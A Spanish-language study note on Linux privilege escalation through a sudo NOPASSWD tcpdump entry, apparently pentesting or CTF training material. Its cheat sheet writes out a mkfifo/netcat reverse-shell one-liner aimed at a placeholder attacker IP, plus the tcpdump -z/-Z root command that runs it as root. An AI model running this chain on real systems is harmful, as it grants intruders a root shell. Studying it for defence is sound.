---
tags:
  - linux
  - privex
---
## Conceptos Clave (TL;DR)

* Los privilegios sudo permiten a una cuenta ejecutar comandos en el contexto de root (u otro usuario) sin tener que cambiar de usuario o tener privilegios excesivos.
* El sistema verifica si el usuario tiene los derechos apropiados configurados en el archivo /etc/sudoers cuando se emite el comando sudo.
* Las entradas de derechos con la opción NOPASSWD se pueden visualizar y ejecutar sin necesidad de ingresar una contraseña.
* Configurar una línea de comandos de manera demasiado flexible puede permitir la ejecución de un programa de forma no intencionada, resultando en un escalamiento de privilegios.

## Herramientas Clave

* **sudo**: Utilizado para verificar los privilegios actuales del usuario y ejecutar comandos en el contexto de root.
* **tcpdump**: Programa de captura de red que, si se puede ejecutar como root sin restricciones a través de sudo, puede utilizarse para ganar una reverse shell usando la opción postrotate-command.
* **nc (Netcat)**: Se utiliza en la máquina atacante como un listener para recibir la conexión de la reverse shell con privilegios de root.

## Metodología Paso a Paso

1. **Reconocimiento de Privilegios**: Al acceder a un sistema, siempre se debe verificar si el usuario actual posee privilegios sudo.
2. **Análisis de Vulnerabilidad**: Identificar si existen binarios permitidos (como tcpdump) con la directiva NOPASSWD. Revisar el manual del comando permitido para encontrar formas de ejecución de comandos del sistema; en tcpdump, la bandera -z permite ejecutar un comando sobre un archivo guardado que se cierra después de cada rotación.
3. **Preparación del Payload**: Crear un script de shell local que contenga un "one-liner" de reverse shell apuntando a la infraestructura del atacante.
4. **Ejecución y Escalamiento**: Iniciar el listener de Netcat en el equipo atacante y ejecutar tcpdump con sudo, utilizando las banderas necesarias para rotar la captura inmediatamente e invocar el script malicioso preparado. Al completarse, se obtendrá una conexión con una shell de root.

## Cheat Sheet de Comandos

```bash
# Verificar los privilegios de sudo del usuario actual.
# Revelará las entradas NOPASSWD sin requerir contraseña.
sudo -l

# Revisar el manual de un binario en busca de opciones de ejecucion de comandos (ej. postrotate-command).
man tcpdump

# Crear el script de shell (.test) con un reverse shell one-liner apuntando al atacante.
cat << 'EOF' > /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f
EOF

# Iniciar un listener de netcat en la maquina atacante para recibir la conexion inversa.
nc -lnvp <ATTACKER_PORT>

# Ejecutar tcpdump como root para activar el payload.
# -ln: Evita resolucion de nombres (optimiza ejecucion).
# -i <INTERFACE>: Especifica la interfaz en la que se va a escuchar.
# -w /dev/null: Escribe los datos en null.
# -W 1 -G 1: Parametros de rotacion (cierra y rota rapidamente).
# -z /tmp/.test: Utiliza el script malicioso como postrotate-command.
# -Z root: Define al usuario root para ejecutar la operacion.

sudo /usr/sbin/tcpdump -ln -i <INTERFACE> -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

## "Gotchas" y Troubleshooting

* **Protección de AppArmor**: En distribuciones más recientes, AppArmor tiene predefinidos los comandos permitidos para postrotate-command, lo que previene efectivamente este tipo de ejecución de comandos.
* **Error de Permiso Denegado**: Durante la ejecución de tcpdump, puede aparecer el error `compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied`. Asegúrate de que el script malicioso en el directorio /tmp tenga los permisos adecuados para ser ejecutado.
* **Abuso del PATH**: Si un administrador no especifica la ruta absoluta de un binario en el archivo sudoers, es posible aprovechar el abuso de PATH para crear un binario malicioso que se ejecute en su lugar.